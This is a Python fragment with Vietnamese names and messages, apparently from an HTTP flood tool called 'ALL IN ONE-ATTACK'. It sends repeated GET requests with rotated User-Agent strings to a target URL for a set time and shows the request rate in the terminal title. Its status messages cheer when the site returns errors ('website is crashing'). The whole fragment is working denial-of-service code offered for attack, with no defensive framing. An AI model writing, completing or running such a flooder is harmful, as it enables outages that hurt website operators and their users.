def cap_nhat_tieu_de_cua_so(so_luong_yeu_cau_tren_giay, so_yeu_cau_moi_mili_giay):
    """Cập nhật tiêu đề của cửa sổ terminal."""
    tieu_de = f"HTTP-REQUESTS | ALL IN ONE Đang Tấn Công | PPS: {so_luong_yeu_cau_tren_giay} | RQS: {so_yeu_cau_moi_mili_giay}"
    if os.name == 'nt':
        os.system(f'title {tieu_de}')

def gui_yeu_cau_http(dia_chi_url):
    """Gửi một yêu cầu HTTP đến địa chỉ URL."""
    danh_sach_tieu_de = {
        'User-Agent': random.choice(USER_AGENTS)
    }
    try:
        phan_hoi = requests.get(dia_chi_url, headers=danh_sach_tieu_de)
        ma_phan_hoi = phan_hoi.status_code
        if ma_phan_hoi == 200:
            print(f"HTTP-REQUESTS | ALL IN ONE Đang Tấn Công | Trạng Thái: 200")
        elif ma_phan_hoi == 500:
            print(f"HTTP-REQUESTS | ALL IN ONE Đang Tấn Công | Trạng Thái: 500 LỖI MÁY CHỦ WEBSITE ĐANG SẬP")
        else:
            print(f"ALL IN ONE-ATTACK | Phiên Bản 1.0 - Sập 503 | Trạng Thái: {ma_phan_hoi}")
    except requests.RequestException as loi:
        print(f"HTTP-REQUESTS | ALL IN ONE Đang Tấn Công | Trạng Thái: 500 LỖI MÁY CHỦ WEBSITE ĐANG SẬP")

def cong_viec_cua_luong(dia_chi_url, thoi_gian_tan_cong, so_yeu_cau_moi_mili_giay):
    """Công việc của một luồng tấn công."""
    thoi_gian_ket_thuc_tan_cong = time.time() + thoi_gian_tan_cong
    while time.time() < thoi_gian_ket_thuc_tan_cong:
        thoi_gian_bat_dau_vong_lap = time.time()
        for _ in range(so_yeu_cau_moi_mili_giay):
            gui_yeu_cau_http(dia_chi_url)
        thoi_gian_da_troi_qua_vong_lap = time.time() - thoi_gian_bat_dau_vong_lap
        so_luong_yeu_cau_tren_giay = so_yeu_cau_moi_mili_giay / thoi_gian_da_troi_qua_vong_lap
        cap_nhat_tieu_de_cua_so(int(so_luong_yeu_cau_tren_giay), so_yeu_cau_moi_mili_giay)

